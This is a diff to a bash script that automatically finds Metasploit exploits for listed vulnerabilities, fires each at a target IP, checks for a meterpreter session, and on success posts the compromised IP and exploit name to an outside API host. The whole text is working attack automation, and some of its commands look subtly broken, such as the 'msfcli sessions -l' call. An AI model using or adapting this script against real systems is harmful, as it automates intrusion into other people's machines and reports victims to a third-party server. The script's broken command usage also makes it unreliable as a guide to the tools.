@@ -141,6 +141,7 @@ do
     # Search in Metasploit Framework
     echo "Searching in Metasploit Framework for $vuln..."
     searchResults=$(msfconsole -q -x "search $vuln" < /dev/null)
+    echo "Search Results: $searchResults"
     if [ -n "$searchResults" ]
     then
         # Extract the highest number in the # column
@@ -157,17 +158,16 @@ do
             # Loop through the exploits and attempt to use them
             for exploit in "${exploits[@]}"; do
                 echo "Using exploit $exploit"
-                msfconsole -q -x "use $exploit; show options; set LHOST tun0; set RHOSTS $IP; run" 
-                if [ $? -eq 0 ]
+                msfcli $exploit LHOST=tun0 RHOSTS=$IP E &
+                sleep 5
+                session=$(msfcli sessions -l | grep "meterpreter" | awk '{print $1}')
+                if [ -n "$session" ]
                 then
                     echo "Exploited vulnerability $vuln using exploit $exploit"
-                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=&IP&exploit=$exploit' > /dev/null 2>&1 &
+                    curl  -m 0 -X POST 'http://api.jake0001.com/pen/exploit_used?ip=$IP&exploit=$exploit' > /dev/null 2>&1 &
                     echo "API Reached!"
                     exploitsFound=1
                     exploit_executed=true
-                    msfconsole -x "sessions"
-                    session_id=$(msfconsole -x "sessions -i" | grep -oP "(\d+)" | tail -1)
-                    echo $session_id
                     break
                 else
                     echo "Failed to exploit vulnerability $vuln using exploit $exploit"
